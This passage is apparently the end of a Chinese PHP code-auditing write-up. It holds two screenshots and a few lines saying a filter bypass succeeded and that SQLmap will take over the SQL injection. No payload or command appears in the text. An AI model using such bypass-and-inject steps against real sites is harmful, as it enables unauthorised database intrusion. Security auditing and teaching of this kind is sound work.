![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/14a2908db28d917f.png)

传入结果如下：

绕过成功，剩下的就交给SQLmap吧。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b9be4d5337e909da.png)

PHP代码审计 · 目录
